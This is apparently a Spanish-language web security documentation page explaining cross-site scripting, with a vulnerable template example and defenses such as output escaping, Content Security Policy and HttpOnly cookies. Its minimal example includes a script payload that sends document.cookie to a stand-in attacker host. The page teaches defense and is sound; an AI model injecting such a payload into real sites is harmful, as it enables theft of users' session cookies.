**Cross-Site Scripting (XSS)** ocurre cuando un atacante logra que su propio JavaScript se ejecute dentro de una página bajo un origen *distinto y de confianza* — lo que significa que ese script corre con el mismo acceso a cookies, DOM y llamadas de API que tendría un script legítimo de esa página. No es un bug del navegador; es un fallo en mantener los datos no confiables separados de ser interpretados como código.

## Un ejemplo mínimo

Si una página renderiza un comentario así sin escaparlo:

```html
<div>{{ comment }}</div>
```

y un comentario contiene `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`, cada visitante que ve ese comentario ejecuta el script del atacante — bajo el propio origen del sitio, con acceso a las cookies de ese sitio (a menos que [`HttpOnly`](/es/security/sessions) esté activado).

## Qué lo detiene realmente

- **Escapar la salida** — codificar los datos controlados por el usuario antes de insertarlos en HTML, de modo que `<script>` se convierta en texto literal (`&lt;script&gt;`) en vez de una etiqueta. La mayoría de los frameworks modernos (React, Vue) hacen esto por defecto, razón por la cual eludirlo manualmente (`dangerouslySetInnerHTML`, `v-html`) merece escrutinio extra.
- **Content Security Policy** — incluso si un marcado malicioso logra pasar, una [CSP](/es/security/content-security-policy) estricta puede bloquear por completo la ejecución de scripts en línea.
- **Cookies `HttpOnly`** — no impiden que el script se ejecute, pero sí impiden que pueda leer las cookies de sesión aunque llegue a ejecutarse.
